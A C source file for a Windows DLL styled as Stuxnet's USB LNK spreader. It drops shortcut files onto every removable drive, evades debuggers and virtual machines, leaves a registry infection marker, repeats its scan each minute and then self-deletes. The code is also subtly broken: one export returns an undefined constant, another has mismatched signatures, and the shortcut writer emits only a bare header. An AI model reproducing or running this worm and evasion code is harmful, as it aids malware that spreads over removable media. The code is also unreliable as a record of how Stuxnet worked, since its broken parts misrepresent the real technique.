#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define LNK_MAGIC                       0x00021401
#define LNK_HEADER_SIZE                 0x4C
#define LNK_MAX_PATH                    260
#define LNK_BUFFER_SIZE                 4096
#define LNK_TARGET_FILE                 L"~WTR4141.tmp"
#define LNK_PAYLOAD_FILE                L"~WTR4132.tmp"

#define LNK_FLAG_HAS_IDLIST             0x00000001
#define LNK_FLAG_HAS_LINKINFO           0x00000002
#define LNK_FLAG_HAS_DESCRIPTION        0x00000004
#define LNK_FLAG_HAS_RELATIVE_PATH      0x00000008
#define LNK_FLAG_HAS_WORKING_DIR        0x00000010
#define LNK_FLAG_HAS_ARGUMENTS          0x00000020
#define LNK_FLAG_HAS_ICON_LOCATION      0x00000040
#define LNK_FLAG_IS_UNICODE             0x00000080
#define LNK_FLAG_FORCE_NO_LINKINFO      0x00000100
#define LNK_FLAG_HAS_EXP_STRING         0x00000200
#define LNK_FLAG_RUN_IN_SEPARATE_PROCESS 0x00000400
#define LNK_FLAG_HAS_LOGO3ID            0x00000800
#define LNK_FLAG_HAS_DARWIN_ID          0x00001000
#define LNK_FLAG_RUN_AS_USER            0x00002000
#define LNK_FLAG_HAS_EXP_ICON           0x00004000
#define LNK_FLAG_NO_PIDL_ALIAS          0x00008000
#define LNK_FLAG_FORCE_UNC_NAME         0x00010000
#define LNK_FLAG_RUN_WITH_SHIM_LAYER    0x00020000
#define LNK_FLAG_HAS_TRAKER             0x00040000
#define LNK_FLAG_ENABLE_TARGET_METADATA 0x00080000
#define LNK_FLAG_DISABLE_LINK_PATH_TRACKING 0x00100000
#define LNK_FLAG_DISABLE_KNOWN_FOLDER_TRACKING 0x00200000
#define LNK_FLAG_DISABLE_KNOWN_FOLDER_ALIAS 0x00400000
#define LNK_FLAG_ALLOW_LINK_TO_LINK     0x00800000
#define LNK_FLAG_ALIAS_TO_APP_TARGET    0x01000000
#define LNK_FLAG_UNUSED_1               0x02000000
#define LNK_FLAG_UNUSED_2               0x04000000
#define LNK_FLAG_UNUSED_3               0x08000000
#define LNK_FLAG_UNUSED_4               0x10000000
#define LNK_FLAG_UNUSED_5               0x20000000
#define LNK_FLAG_UNUSED_6               0x40000000
#define LNK_FLAG_UNUSED_7               0x80000000

#define LNK_FILE_ATTRIBUTE_READONLY     0x00000001
#define LNK_FILE_ATTRIBUTE_HIDDEN       0x00000002
#define LNK_FILE_ATTRIBUTE_SYSTEM       0x00000004
#define LNK_FILE_ATTRIBUTE_DIRECTORY    0x00000010
#define LNK_FILE_ATTRIBUTE_ARCHIVE      0x00000020
#define LNK_FILE_ATTRIBUTE_NORMAL       0x00000080
#define LNK_FILE_ATTRIBUTE_TEMPORARY    0x00000100
#define LNK_FILE_ATTRIBUTE_SPARSE_FILE  0x00000200
#define LNK_FILE_ATTRIBUTE_REPARSE_POINT 0x00000400
#define LNK_FILE_ATTRIBUTE_COMPRESSED   0x00000800
#define LNK_FILE_ATTRIBUTE_OFFLINE      0x00001000
#define LNK_FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
#define LNK_FILE_ATTRIBUTE_ENCRYPTED    0x00004000
#define LNK_FILE_ATTRIBUTE_VIRTUAL      0x00010000

#define LNK_SHOW_CMD_SW_HIDE            0
#define LNK_SHOW_CMD_SW_NORMAL          1
#define LNK_SHOW_CMD_SW_SHOWMINIMIZED   2
#define LNK_SHOW_CMD_SW_SHOWMAXIMIZED   3
#define LNK_SHOW_CMD_SW_SHOWNOACTIVATE  4
#define LNK_SHOW_CMD_SW_SHOW            5
#define LNK_SHOW_CMD_SW_MINIMIZE        6
#define LNK_SHOW_CMD_SW_SHOWMINNOACTIVE 7
#define LNK_SHOW_CMD_SW_SHOWNA          8
#define LNK_SHOW_CMD_SW_RESTORE         9
#define LNK_SHOW_CMD_SW_SHOWDEFAULT     10
#define LNK_SHOW_CMD_SW_FORCEMINIMIZE   11

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _LNK_SHELL_HEADER {
    DWORD dwHeaderSize;
    GUID  guidCLSID;
    DWORD dwFlags;
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftAccessTime;
    FILETIME ftWriteTime;
    DWORD dwFileSize;
    DWORD dwIconIndex;
    DWORD dwShowCmd;
    WORD  wHotKey;
    WORD  wReserved1;
    DWORD dwReserved2;
    DWORD dwReserved3;
} LNK_SHELL_HEADER, * PLNK_SHELL_HEADER;

typedef struct _LNK_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[LNK_MAX_PATH];
    WCHAR szSystemPath[LNK_MAX_PATH];
    WCHAR szWindowsPath[LNK_MAX_PATH];
    WCHAR szDrivePath[LNK_MAX_PATH];
    BYTE bReserved[256];
} LNK_CTX, * PLNK_CTX;

static LNK_CTX g_LnkCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwLNKCreated = 0;
static DWORD g_dwDriveCount = 0;
static DWORD g_dwFileWriteCount = 0;

static const WCHAR* g_LNKNames[4] = {
    L"Copy of Shortcut to.lnk",
    L"Copy of Copy of Shortcut to.lnk",
    L"Copy of Copy of Copy of Shortcut to.lnk",
    L"Copy of Copy of Copy of Copy of Shortcut to.lnk"
};

static const WCHAR* g_LNKTargets[4] = {
    L".STORAGE#RemovableMedia#7&[ID]&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#RemovableMedia#8&[ID]&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_&Prod_USB_FLASH_DRIVE&Rev_PMAP#0798018356734E4F&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp",
    L".STORAGE#Volume#_??_USBSTOR#Disk&Ven_&Prod_USB_FLASH_DRIVE&Rev_PMAP#0798018356734E4F&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}~WTR4141.tmp"
};

static GUID g_LNK_CLSID = {0x00021401, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static BOOL LNK_Init(VOID);
static VOID LNK_Cleanup(VOID);
static BOOL LNK_CheckMutex(VOID);
static BOOL LNK_IsExpired(VOID);
static BOOL LNK_CheckDebugger(VOID);
static BOOL LNK_CheckVMware(VOID);
static BOOL LNK_WriteLNKToDisk(LPCWSTR szPath, PLNK_SHELL_HEADER pHeader);
static BOOL LNK_BuildLNKHeader(PLNK_SHELL_HEADER pHeader, LPCWSTR szTarget);
static BOOL LNK_CreateLNKFiles(LPCWSTR szDrive);
static BOOL LNK_ScanDrives(VOID);
static BOOL LNK_WriteRegistry(VOID);
static BOOL LNK_ReadRegistry(VOID);
static DWORD WINAPI LNK_WorkerThread(LPVOID lpParam);
static BOOL LNK_StartWorker(VOID);
static BOOL LNK_StopWorker(VOID);
static BOOL LNK_SelfDestruct(VOID);
static BOOL LNK_Execute(VOID);
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL LNK_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_LnkCtx, sizeof(LNK_CTX));
    g_LnkCtx.dwMagic = STUXNET_MAGIC;
    g_LnkCtx.dwVersion = STUXNET_VERSION;
    g_LnkCtx.dwPid = GetCurrentProcessId();
    g_LnkCtx.dwTid = GetCurrentThreadId();
    g_LnkCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_LnkCtx.csLock);
    GetModuleFileNameW(NULL, g_LnkCtx.szModulePath, LNK_MAX_PATH);
    GetSystemDirectoryW(g_LnkCtx.szSystemPath, LNK_MAX_PATH);
    GetWindowsDirectoryW(g_LnkCtx.szWindowsPath, LNK_MAX_PATH);
    wcscpy_s(g_LnkCtx.szDrivePath, LNK_MAX_PATH, L"C:\\");
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID LNK_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_LnkCtx.hMutex) {
        CloseHandle(g_LnkCtx.hMutex);
        g_LnkCtx.hMutex = NULL;
    }
    if (g_LnkCtx.hThread) {
        CloseHandle(g_LnkCtx.hThread);
        g_LnkCtx.hThread = NULL;
    }
    if (g_LnkCtx.hStopEvent) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_LnkCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL LNK_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_LnkCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL LNK_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL LNK_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL LNK_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static BOOL LNK_WriteLNKToDisk(LPCWSTR szPath, PLNK_SHELL_HEADER pHeader) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pHeader) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pHeader, sizeof(LNK_SHELL_HEADER), &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwFileWriteCount++;
    return TRUE;
}

static BOOL LNK_BuildLNKHeader(PLNK_SHELL_HEADER pHeader, LPCWSTR szTarget) {
    SYSTEMTIME st;
    if (!pHeader) return FALSE;
    ZeroMemory(pHeader, sizeof(LNK_SHELL_HEADER));
    pHeader->dwHeaderSize = LNK_HEADER_SIZE;
    pHeader->guidCLSID = g_LNK_CLSID;
    pHeader->dwFlags = LNK_FLAG_HAS_IDLIST | LNK_FLAG_HAS_LINKINFO |
                       LNK_FLAG_HAS_RELATIVE_PATH | LNK_FLAG_HAS_WORKING_DIR |
                       LNK_FLAG_HAS_ARGUMENTS | LNK_FLAG_IS_UNICODE;
    pHeader->dwFileAttributes = LNK_FILE_ATTRIBUTE_NORMAL;
    GetSystemTimeAsFileTime(&pHeader->ftCreationTime);
    pHeader->ftAccessTime = pHeader->ftCreationTime;
    pHeader->ftWriteTime = pHeader->ftCreationTime;
    pHeader->dwFileSize = 0x20000;
    pHeader->dwIconIndex = 0;
    pHeader->dwShowCmd = LNK_SHOW_CMD_SW_NORMAL;
    pHeader->wHotKey = 0;
    pHeader->wReserved1 = 0;
    pHeader->dwReserved2 = 0;
    pHeader->dwReserved3 = 0;
    return TRUE;
}

static BOOL LNK_CreateLNKFiles(LPCWSTR szDrive) {
    WCHAR szPath[LNK_MAX_PATH];
    LNK_SHELL_HEADER header;
    DWORD i;
    if (!szDrive) return FALSE;
    for (i = 0; i < 4; i++) {
        wsprintfW(szPath, L"%s%s", szDrive, g_LNKNames[i]);
        LNK_BuildLNKHeader(&header, g_LNKTargets[i]);
        if (LNK_WriteLNKToDisk(szPath, &header)) {
            g_dwLNKCreated++;
        }
    }
    return TRUE;
}

static BOOL LNK_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wcscpy_s(g_LnkCtx.szDrivePath, LNK_MAX_PATH, szDrive);
                LNK_CreateLNKFiles(szDrive);
                g_dwDriveCount++;
            }
        }
    }
    return TRUE;
}

static BOOL LNK_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL LNK_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI LNK_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_LnkCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (LNK_IsExpired()) {
            break;
        }
        if (!LNK_ReadRegistry()) {
            LNK_WriteRegistry();
        }
        LNK_ScanDrives();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL LNK_StartWorker(VOID) {
    g_LnkCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_LnkCtx.hStopEvent) return FALSE;
    g_LnkCtx.hThread = CreateThread(NULL, 0, LNK_WorkerThread, NULL, 0, NULL);
    if (!g_LnkCtx.hThread) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL LNK_StopWorker(VOID) {
    if (g_LnkCtx.hStopEvent) {
        SetEvent(g_LnkCtx.hStopEvent);
    }
    if (g_LnkCtx.hThread) {
        WaitForSingleObject(g_LnkCtx.hThread, 5000);
        CloseHandle(g_LnkCtx.hThread);
        g_LnkCtx.hThread = NULL;
    }
    if (g_LnkCtx.hStopEvent) {
        CloseHandle(g_LnkCtx.hStopEvent);
        g_LnkCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL LNK_SelfDestruct(VOID) {
    WCHAR szPath[LNK_MAX_PATH];
    DWORD i;
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD j;
    dwDrives = GetLogicalDrives();
    for (j = 0; j < 26; j++) {
        if (dwDrives & (1 << j)) {
            szDrive[0] = L'A' + j;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                for (i = 0; i < 4; i++) {
                    wsprintfW(szPath, L"%s%s", szDrive, g_LNKNames[i]);
                    DeleteFileW(szPath);
                }
            }
        }
    }
    return TRUE;
}

static BOOL LNK_Execute(VOID) {
    HANDLE hMutex;
    if (!LNK_Init()) return FALSE;
    if (LNK_IsExpired()) {
        LNK_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    if (LNK_CheckDebugger()) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    if (LNK_CheckVMware()) {
        CloseHandle(hMutex);
        LNK_Cleanup();
        return FALSE;
    }
    LNK_WriteRegistry();
    LNK_ReadRegistry();
    LNK_ScanDrives();
    LNK_StartWorker();
    while (WaitForSingleObject(g_LnkCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (LNK_IsExpired()) {
            break;
        }
        LNK_ScanDrives();
    }
    LNK_StopWorker();
    LNK_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            LNK_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LNK_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return LNK_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(LPCWSTR szDrive) {
    return LNK_CreateLNKFiles(szDrive) ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return LNK_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return LNK_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return LNK_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    LNK_StopWorker();
    return 0;
}

DWORD WINAPI Export8(VOID) {
    LNK_SelfDestruct();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    return (DWORD)g_LnkCtx.dwPid;
}

DWORD WINAPI Export10(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export11(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export12(VOID) {
    return g_dwLNKCreated;
}

DWORD WINAPI Export13(VOID) {
    return g_dwDriveCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwFileWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_LnkCtx.hMutex;
}

DWORD WINAPI Export16(VOID) {
    return LNK_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return LNK_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return LNK_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_LnkCtx.szDrivePath;
}

DWORD WINAPI Export20(VOID) {
    return LNK_VERSION;
}